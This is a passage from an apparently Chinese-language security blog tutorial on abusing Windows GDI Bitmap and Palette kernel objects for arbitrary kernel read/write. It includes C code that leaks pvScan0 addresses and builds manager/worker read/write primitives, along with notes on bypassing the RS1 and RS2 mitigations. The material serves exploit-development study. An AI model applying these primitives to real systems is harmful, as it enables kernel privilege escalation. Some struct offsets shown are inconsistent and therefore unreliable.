<li><a target="_blank" rel="noopener" href="https://fuzzysecurity.com/tutorials/expDev/21.html">Part 17: Kernel Exploitation -&gt; GDI Bitmap Abuse (Win7-10 32&#x2F;64bit)</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.quarkslab.com/reverse-engineering-the-win32k-type-isolation-mitigation.html">Reverse Engineering the Win32k Type Isolation Mitigation</a>——其参考文章很重要</li>
<li><a target="_blank" rel="noopener" href="https://labs.bluefrostsecurity.de/files/Abusing_GDI_for_ring0_exploit_primitives_Evolution_Slides.pdf">Abusing GDI for ringo exploit primitives: Evolution</a></li>
<li><a target="_blank" rel="noopener" href="https://www.coresecurity.com/sites/default/files/private-files/publications/2016/10/Abusing-GDI-Reloaded-ekoparty-2016_0.pdf">Abusing GDI for ringo exploit primitives: RELOADED</a></li>
<li><a target="_blank" rel="noopener" href="https://sensepost.com/blog/2017/abusing-gdi-objects-for-ring0-primitives-revolution/">Abusing GDI Objects for ring0 Primitives Revolution</a></li>
<li><a target="_blank" rel="noopener" href="http://theevilbit.blogspot.com/2017/10/abusing-gdi-objects-bitmap-objects-size.html">Abusing GDI objects: Bitmap object’s size in the kernel pool</a></li>
</ul>
<p>Dump <a target="_blank" rel="noopener" href="http://ryze-t.com/2021/11/23/GDI-%E5%AF%B9%E8%B1%A1%E5%88%A9%E7%94%A8/">GDI 对象利用</a>：</p>
<p><strong>0x00 前言</strong></p>
<p>普通显示器是由像素点构成的，显示时采用扫描的方法，这种显示器被称为位映像设备。位映象，就是指一个二维的像素矩阵，<strong>Bitmap(位图)</strong> 就是采用位映象方法显示和存储的图象。</p>
<p>当一幅图中每个像素点赋予不同的 RGB 值时，就能呈现不同的颜色，用来指定对应颜色的 RGB 表就被称为<strong>Palette(调色板</strong> )。</p>
<h3 id="1-1-Bitmap基础概念"><a href="#1-1-Bitmap基础概念" class="headerlink" title="1.1 Bitmap基础概念"></a>1.1 Bitmap基础概念</h3><p><strong>CreateBitmap</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HBITMAP <span class="title">CreateBitmap</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] <span class="keyword">int</span>        nWidth,   <span class="comment">// 位图宽度，像素为单位</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [in] <span class="keyword">int</span>        nHeight,  <span class="comment">// 位图高度，像素为单位</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [in] UINT       nPlanes,  <span class="comment">// 设备使用的颜色位面数</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [in] UINT       nBitCount, <span class="comment">// 用来区分单个像素点颜色的位数</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [in] <span class="keyword">const</span> VOID *lpBits   <span class="comment">// 指向颜色数据数组的指针</span></span></span></span><br></pre></td></tr></table></figure>

<p>如果成功返回创建位图的句柄，如果创建BitMap时 lpBits不指定 则会额外创建池块处理PvScan0。</p>
<p><strong>SURFACE OBJECT</strong></p>
<p>随着位图一样被创建的还有 SURFACE OBJECT</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  BASEOBJECT64 BaseObject; <span class="comment">// 0x00</span></span><br><span class="line">  SURFOBJ64 SurfObj; <span class="comment">// 0x18</span></span><br><span class="line">  [...]</span><br><span class="line">&#125; SURFACE64;</span><br></pre></td></tr></table></figure>

<p>它包含了两个结构体： BASEOBJECT 和 SURFOBJ。SURFOBJ.pvScan0 还指向一块名为 Pixel Data 的数据区。</p>
<p><a target="_blank" rel="noopener" href="https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329100213.png"><img data-src="https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329100213.png" alt="img"></a></p>
<p>SURFOBJ 官方有详细的定义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  ULONG64 dhsurf; <span class="comment">// 0x00</span></span><br><span class="line">  ULONG64 hsurf; <span class="comment">// 0x08</span></span><br><span class="line">  ULONG64 dhpdev; <span class="comment">// 0x10</span></span><br><span class="line">  ULONG64 hdev; <span class="comment">// 0x18</span></span><br><span class="line">  SIZEL sizlBitmap; <span class="comment">// 0x20</span></span><br><span class="line">  ULONG64 cjBits; <span class="comment">// 0x28</span></span><br><span class="line">  ULONG64 pvBits; <span class="comment">// 0x30</span></span><br><span class="line">  ULONG64 pvScan0; <span class="comment">// 0x38</span></span><br><span class="line">  ULONG32 lDelta; <span class="comment">// 0x40</span></span><br><span class="line">  ULONG32 iUniq; <span class="comment">// 0x44</span></span><br><span class="line">  ULONG32 iBitmapFormat; <span class="comment">// 0x48</span></span><br><span class="line">  USHORT iType; <span class="comment">// 0x4C</span></span><br><span class="line">  USHORT fjBitmap; <span class="comment">// 0x4E</span></span><br><span class="line">&#125; SURFOBJ64; <span class="comment">// sizeof = 0x50</span></span><br></pre></td></tr></table></figure>

<p><strong>GetbitmapBits 和 SetBitmapBits</strong></p>
<p>Pixel Data 可以由 GetbitmapBits 和 SetBitmapBits 来控制读写。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LONG <span class="title">GetBitmapBits</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]  HBITMAP hbit,   <span class="comment">// 位图的句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [in]  LONG    cb,     <span class="comment">// 要从位图复制到缓冲区的字节数</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [out] LPVOID  lpvBits <span class="comment">// 指向缓冲区的指针</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"><span class="function">LONG <span class="title">SetBitmapBits</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] HBITMAP    hbm,    <span class="comment">// 位图的句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [in] DWORD      cb,     <span class="comment">// 指定参数lpBits指向的数组的字节数</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [in] <span class="keyword">const</span> VOID *pvBits <span class="comment">// 指向包含指定位图颜色数据的字节数组的指针</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h3 id="1-2-Bitmap-任意地址读写（-lt-1607）"><a href="#1-2-Bitmap-任意地址读写（-lt-1607）" class="headerlink" title="1.2 Bitmap 任意地址读写（&lt;1607）"></a>1.2 Bitmap 任意地址读写（&lt;1607）</h3><p>Pixel Data 可以由 GetbitmapBits 和 SetBitmapBits 来控制读写。pvScan0 和它指向的数据区 Pixel Data 都在内核空间，因此利用GetbitmapBits 和 SetBitmapBits 就可以做到内核空间的读写，但是并不能做到任意地址读写。</p>
<p>如果存在一次任意地址写的机会，就可以通过修改 pvScan0 来获得任意地址读写的能力。</p>
<p><strong>获取 pvScan0 地址的方法</strong></p>
<ol>
<li>NtCurrentTeb 来获得 teb 的基址</li>
<li>x64 下 teb 偏移 0x60 获得 peb 的基址</li>
</ol>
<p><a target="_blank" rel="noopener" href="https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329100217.png"><img data-src="https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329100217.png" alt="img"></a></p>
<ol>
<li>peb 0xf8 偏移处获得 GdiSharedHandleTable 地址</li>
</ol>
<p><a target="_blank" rel="noopener" href="https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329100219.png"><img data-src="https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329100219.png" alt="img"></a></p>
<ol>
<li>GdiSharedHandleTable 是一个 GDICELL 结构体数组，成员对应进程中的每个GDI对象，数组索引是CreateBitmap 返回的句柄 hBitmap的低十六位，即 <code>index = hBitmap &amp; 0xFFFF</code></li>
<li>GDICELL 结构如下：</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">GDI_CELL</span>&#123;</span></span><br><span class="line">  PVOID64 pKernelAddress; <span class="comment">// 0x00</span></span><br><span class="line">  USHORT wProcessId; <span class="comment">// 0x08</span></span><br><span class="line">  USHORT wCount; <span class="comment">// 0x0a</span></span><br><span class="line">  USHORT wUpper; <span class="comment">// 0x0c</span></span><br><span class="line">  USHORT wType; <span class="comment">// 0x0e</span></span><br><span class="line">  PVOID64 pUserAddress; <span class="comment">// 0x10</span></span><br><span class="line">&#125; GDICELL64; <span class="comment">// sizeof = 0x18</span></span><br></pre></td></tr></table></figure>

<p>    <code>pKernelAddress = PEB.GdiSharedHandleTable + (handle &amp; 0xffff) * sizeof(GDICELL64)</code></p>
<ol>
<li>pKernelAddress 指向 BASEOBJECT ，SURFOBJ 在偏移 0x18 处，<code>SURFOBJ = BASEOBJECT + 0x18</code></li>
<li>pvScan0 在 SURFOBJ 0x38 偏移处，<code>pvScan0 = SURFOBJ + 0x38</code></li>
</ol>
<p>整体代码为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">DWORD64 tebAddr = NtCurrentTeb();</span><br><span class="line"></span><br><span class="line">DWORD64 pebAddr = *(PDWORD64)((PUCHAR)tebAddr + <span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line">DWORD64 gdiSharedHandleTableAddr = *(PDWORD64)((PUCHAR)pebAddr + <span class="number">0xf8</span>);</span><br><span class="line"></span><br><span class="line">DWORD64 pKernelAddress = gdiSharedHandleTableAddr  + ((DWORD64) hBitmap &amp; <span class="number">0xffff</span>) * <span class="number">0x18</span>;</span><br><span class="line"></span><br><span class="line">DWORD64 surfObj = *(PDWORD64)pKernelAddress +<span class="number">0x18</span>;</span><br><span class="line"></span><br><span class="line">DWORD64 pvScan0Addr = surfObj + <span class="number">0x38</span>;</span><br></pre></td></tr></table></figure>



<p><strong>整体利用思路</strong></p>
<ol>
<li>CreateBitmap 创建两个 Bitmap，获得两个句柄 hManager 和 hWorker</li>
<li>获取 hManager 和 hWorker 的 pvScan0 地址</li>
<li>利用一次任意地址写的能力，使 hManager 的 pvScan0 的值为 hWorker 的 pvScan0 的地址，即 *hManager_pvScan0 &#x3D; hWorker_pvScan0</li>
<li>任意写（完成向 0x1234 地址写入 0xAAAA）：</li>
</ol>
<p>    - 利用 SetBitmapBits 向 hManager_pvScan0 指向的地址写入 0x1234</p>
<p>    - 利用 SetBitmapBits 向 hWorker_pvScan0 指向的地址写入 0xAAAA</p>
<ol>
<li>任意读（完成读取 0x1234 地址的值）</li>
</ol>
<p>    - 利用 SetBitmapBits 向 hManager_pvScan0 指向的地址写入 0x1234</p>
<p>    - 利用 GetBitmapBits 读取 hManager_pvScan0 指向的地址的值</p>
<p>代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD64 <span class="title">GetpvScan0Addr</span><span class="params">(HBITMAP hBitmap)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  DWORD64 tebAddr = NtCurrentTeb();</span><br><span class="line">  DWORD64 pebAddr = *(PDWORD64)((PUCHAR)tebAddr + <span class="number">0x60</span>);</span><br><span class="line">  DWORD64 gdiSharedHandleTableAddr = *(PDWORD64)((PUCHAR)pebAddr + <span class="number">0xf8</span>);</span><br><span class="line">  DWORD64 pKernelAddress = gdiSharedHandleTableAddr + ((DWORD64)hBitmap &amp; <span class="number">0xffff</span>) * <span class="number">0x18</span>;</span><br><span class="line">  DWORD64 surfObj = pKernelAddress + <span class="number">0x18</span>;</span><br><span class="line">  DWORD64 pvScan0Addr = surfObj + <span class="number">0x38</span>;</span><br><span class="line">  <span class="keyword">return</span> pvScan0Addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">ReadOOB</span><span class="params">(HBITMAP hManager,HBITMAP hWorker,DWORD64 writeAddr, LPVOID readValue, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  SetBitmapBits(hManager,len,&amp;writeAddr);</span><br><span class="line">  GetBitmapBits(hWorker, len, readValue);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">WriteOOB</span><span class="params">(HBITMAP hManager, HBITMAP hWorker, DWORD64 writeAddr, LPVOID writeValue, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  SetBitmapBits(hManager, len, &amp;writeAddr);</span><br><span class="line">  SetBitmapBits(hWorker, len, writeValue);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  HBITMAP hManager = CreateBitmap(<span class="number">0x20</span>, <span class="number">0x20</span>, <span class="number">0x1</span>, <span class="number">0x8</span>, <span class="literal">NULL</span>);</span><br><span class="line">  HBITMAP hWorker = CreateBitmap(<span class="number">0x20</span>, <span class="number">0x20</span>, <span class="number">0x1</span>, <span class="number">0x8</span>, <span class="literal">NULL</span>);</span><br><span class="line">  DWORD64 hManager_pvScan0 = GetpvScan0Addr(hManager);</span><br><span class="line">  DWORD64 hWorker_pvScan0 = GetpvScan0Addr(hWorker);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="1-3-绕过-RS1-缓解措施（-lt-1703）"><a href="#1-3-绕过-RS1-缓解措施（-lt-1703）" class="headerlink" title="1.3 绕过 RS1 缓解措施（&lt;1703）"></a>1.3 绕过 RS1 缓解措施（&lt;1703）</h3><p>Windows RS1 对 Bitmap 做了缓解措施，<code>GdiSharedHandleTable </code>不再透露内核地址。，因此通过 pKernelAddress 找到 pvScan0 地址的方法失效了。</p>
<p>Windows 中共有三种类型的对象，分别是 User object、GDI object、Kernel object。Bitmap 属于 GDI object，存在换页对象池:</p>
<p><a target="_blank" rel="noopener" href="https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329100224.png"><img data-src="https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329100224.png" alt="img"></a></p>
<p>Accelerator table 对象属于 User object，也存在于换页会话池中。Accelerator table 对象地址可以通过 pKernel 获得，因此如果可以让 Bitmap 对象重用 Accelerator table 对象，就可以再次找到 pvScan0 地址。</p>
<p><strong>获取对象地址</strong></p>
<p>user32.dll 有一个全局变量结构—gSharedInfo，结构如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SHAREDINFO</span></span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line">  PSERVERINFO  psi;</span><br><span class="line">  PHANDLEENTRY aheList;</span><br><span class="line">  ULONG_PTR    HeEntrySize;</span><br><span class="line">  PDISPLAYINFO pDisplayInfo;</span><br><span class="line">  ULONG_PTR    ulSharedDelta;</span><br><span class="line">  WNDMSG       awmControl[<span class="number">27</span>];</span><br><span class="line">  WNDMSG       awmControl[<span class="number">31</span>];</span><br><span class="line">  WNDMSG       DefWindowMsgs;</span><br><span class="line">  WNDMSG       DefWindowSpecMsgs;</span><br><span class="line">&#125; SHAREDINFO, *PSHAREDINFO;</span><br></pre></td></tr></table></figure>

<p>ahelist 是一个指向一张结构为 USER_HANDLE_ENTRY 的表，其结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">USER_HANDLE_ENTRY</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span>* pKernel;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        PVOID pi;</span><br><span class="line">        PVOID pti;</span><br><span class="line">        PVOID ppi;</span><br><span class="line">    &#125;;</span><br><span class="line">    BYTE type;</span><br><span class="line">    BYTE flags;</span><br><span class="line">    WORD generation;</span><br><span class="line">&#125; USER_HANDLE_ENTRY, * PUSER_HANDLE_ENTRY;</span><br></pre></td></tr></table></figure>

<p>首地址就指向 pKernel，与 GDICELL 结构数组中的 pKernelAddress 一样，通过相同的计算方式就可以获得该对象地址。</p>
<p><strong>对象重用</strong></p>
<p>类似堆喷的手法，创建多个 Accelerator table 对象再销毁，再创建 Bitmap 对象，使其复用。</p>
<h3 id="1-4-绕过-RS2-缓解措施（-lt-1709）"><a href="#1-4-绕过-RS2-缓解措施（-lt-1709）" class="headerlink" title="1.4 绕过 RS2 缓解措施（&lt;1709）"></a>1.4 绕过 RS2 缓解措施（&lt;1709）</h3><p>微软在 RS2 把 HADNLE_ENRTY结构体的pkernel 禁掉了，因此通过 Accelerator table 重用的方式也就失效了。</p>
<p>微软的缓解措施要去绕过，其本质也是泄露 Windows 对象，释放再申请 Bitmap，从而泄露 Bitmap 对象的地址。</p>
<p>这里就涉及到两个概念，一个是窗口菜单名 lpszMenuName，一个是 HMValidateHandle。</p>
<p>HMValidateHandle 可以通过传入窗口句柄，获得在桌面堆的 tagWnd 指针，通过这个指针可以泄露出内核地址（详情见<a target="_blank" rel="noopener" href="https://ryze-t.com/posts/2021/09/08/HMValidateHandle.html%EF%BC%89%E3%80%82">https://ryze-t.com/posts/2021/09/08/HMValidateHandle.html）。</a></p>
<p>lpszMenuName 指向的是存放菜单名的 paged pool，通过 tagWnd 找到 lpszMenuName 对象的地址，类似于 Accelerator table 的形式获取到 pvScan0 的地址。</p>
<h3 id="2-1-Palette基础概念"><a href="#2-1-Palette基础概念" class="headerlink" title="2.1 Palette基础概念"></a>2.1 Palette基础概念</h3><p>Bitmap 的问题在 RS3(1709) 终于被解决，于是又出现了新的解决办法—Palette，Palette 的利用方式与 Bitmap相似</p>
<p>Palette 结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PALETTE64</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    BASEOBJECT64      BaseObject;    <span class="comment">// 0x00</span></span><br><span class="line">    FLONG           flPal;         <span class="comment">// 0x18</span></span><br><span class="line">    ULONG32           cEntries;      <span class="comment">// 0x1C</span></span><br><span class="line">    ULONG32           ulTime;        <span class="comment">// 0x20 </span></span><br><span class="line">    HDC             hdcHead;       <span class="comment">// 0x24</span></span><br><span class="line">    ULONG64        hSelected;     <span class="comment">// 0x28, </span></span><br><span class="line">    ULONG64           cRefhpal;      <span class="comment">// 0x30</span></span><br><span class="line">    ULONG64          cRefRegular;   <span class="comment">// 0x34</span></span><br><span class="line">    ULONG64      ptransFore;    <span class="comment">// 0x3c</span></span><br><span class="line">    ULONG64      ptransCurrent; <span class="comment">// 0x44</span></span><br><span class="line">    ULONG64      ptransOld;     <span class="comment">// 0x4C</span></span><br><span class="line">    ULONG32           unk_038;       <span class="comment">// 0x38</span></span><br><span class="line">    ULONG64         pfnGetNearest; <span class="comment">// 0x3c</span></span><br><span class="line">    ULONG64   pfnGetMatch;   <span class="comment">// 0x40</span></span><br><span class="line">    ULONG64           ulRGBTime;     <span class="comment">// 0x44</span></span><br><span class="line">    ULONG64       pRGBXlate;     <span class="comment">// 0x48</span></span><br><span class="line">    PALETTEENTRY    *pFirstColor;  <span class="comment">// 0x80</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">PALETTE</span> *<span class="title">ppalThis</span>;</span>     <span class="comment">// 0x88</span></span><br><span class="line">    PALETTEENTRY    apalColors[<span class="number">3</span>]; <span class="comment">// 0x90</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该结构偏移 0x80 处存在一个指针 pFirstColor，指向的是偏移 0x90 的 4 字节数组 apalColors。</p>
<p>类比与 Bitmap，pFirstColor 就是 pvScan0， apalColors[3] 就是 pixel Data。</p>
<p>PALETTEENTRY 结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">class <span class="title">PALETTEENTRY</span><span class="params">(Structure)</span>:</span></span><br><span class="line"><span class="function"> _fields_ </span>= [</span><br><span class="line">  (<span class="string">&quot;peRed&quot;</span>, BYTE),</span><br><span class="line">  (<span class="string">&quot;peGreen&quot;</span>, BYTE),</span><br><span class="line">  (<span class="string">&quot;peBlue&quot;</span>, BYTE),</span><br><span class="line">  (<span class="string">&quot;peFlags&quot;</span>, BYTE)</span><br><span class="line"> ]</span><br></pre></td></tr></table></figure>



<h3 id="2-2-CreatePalette"><a href="#2-2-CreatePalette" class="headerlink" title="2.2 CreatePalette"></a>2.2 CreatePalette</h3><p>CreatePalette 创建一个逻辑调色板，具体函数用法如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HPALETTE <span class="title">CreatePalette</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] <span class="keyword">const</span> LOGPALETTE *plpal</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>LOGPALETTE 结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagLOGPALETTE</span> &#123;</span></span><br><span class="line">  WORD         palVersion;     <span class="comment">// 0x300</span></span><br><span class="line">  WORD         palNumEntries;  <span class="comment">//  palNumEntries = (size-0x90)/4</span></span><br><span class="line">  PALETTEENTRY palPalEntry[<span class="number">1</span>];</span><br><span class="line">&#125; LOGPALETTE, *PLOGPALETTE, *NPLOGPALETTE, *LPLOGPALETTE;</span><br></pre></td></tr></table></figure>

<p>函数使用模板如下：</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HPALETTE <span class="title">createPaletteofSize</span><span class="params">(<span class="keyword">int</span> size)</span> </span>&#123;  <span class="keyword">if</span> (size &lt;= <span class="number">0x90</span>) &#123;    <span class="built_in">printf</span>(<span class="string">&quot;bad size! can&#x27;t allocate palette of size &lt; 0x90!\n&quot;</span>);    <span class="keyword">return</span> <span class="number">0</span>;  &#125;  <span class="keyword">int</span> pal_cnt = (size - <span class="number">0x90</span>) / <span class="number">4</span>;  <span class="keyword">int</span> palsize = <span class="built_in"><span class="keyword">sizeof</span></span>(LOGPALETTE) + (pal_cnt - <span class="number">1</span>) * <span class="built_in"><span class="keyword">sizeof</span></span>(PALETTEENTRY);  LOGPALETTE *lPalette = (LOGPALETTE*)<span class="built_in">malloc</span>(palsize);  <span class="built_in">memset</span>(lPalette, <span class="number">0x4</span>, palsize);  lPalette-&gt;palNumEntries = pal_cnt;  lPalette-&gt;palVersion = <span class="number">0x300</span>;  <span class="keyword">return</span> <span class="built_in">CreatePalette</span>(lPalette); &#125; </span><br></pre></td></tr></table></figure>



<h3 id="2-3-GetPaletteEntries-x2F-SetPaletteEntries"><a href="#2-3-GetPaletteEntries-x2F-SetPaletteEntries" class="headerlink" title="2.3 GetPaletteEntries&#x2F;SetPaletteEntries"></a>2.3 GetPaletteEntries&#x2F;SetPaletteEntries</h3><p>与 Bitmap 类似，Palette 中也有类似 API，让我们可以操作 apalColors[3]。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">UINT <span class="title">GetPaletteEntries</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]  HPALETTE       hpal,        <span class="comment">// palette 句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [in]  UINT           iStart,      <span class="comment">// 要提取的逻辑调色板中的第一项</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [in]  UINT           cEntries,    <span class="comment">// 要提取的逻辑调色板中的项数</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [out] LPPALETTEENTRY pPalEntries  <span class="comment">// 接受调色项目的PALETTEENTRY结构数组的指针，该数组所含结构的数目至少为nEntries参数指定的数目</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"><span class="function">UINT <span class="title">SetPaletteEntries</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] HPALETTE           hpal,        <span class="comment">// palette 句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [in] UINT               iStart,      <span class="comment">// 要设置的逻辑调色板中的第一项</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [in] UINT               cEntries,    <span class="comment">// 要设置的逻辑调色板中的项数</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [in] <span class="keyword">const</span> PALETTEENTRY *pPalEntries <span class="comment">// 指向包含RGB值和标志的PALETTEENTRY结构数组的第一个元素</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h3 id="2-4-利用思路"><a href="#2-4-利用思路" class="headerlink" title="2.4 利用思路"></a>2.4 利用思路</h3><p>整体利用思路与 Bitmap 类似。</p>
<p>新建两个 Palette object：hWorker 和 hManager，利用堆喷射的手法获取到两个对象的pFirstColor指针的内核地址，将hManager的pFirstColor指针指向hWorker的pFirstColor指针的存放地址，利用 SetPaletteEntries 将 hWorker.pFirstColor 修改为 0x1234，利用 SetPaletteEntries 往 0x1234 中写入 0xABCD；利用 SetPaletteEntries 将 hWorker.pFirstColor 修改为 0x4321，利用 GetPaletteEntries 从 0x4321 中读取相应值。</p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
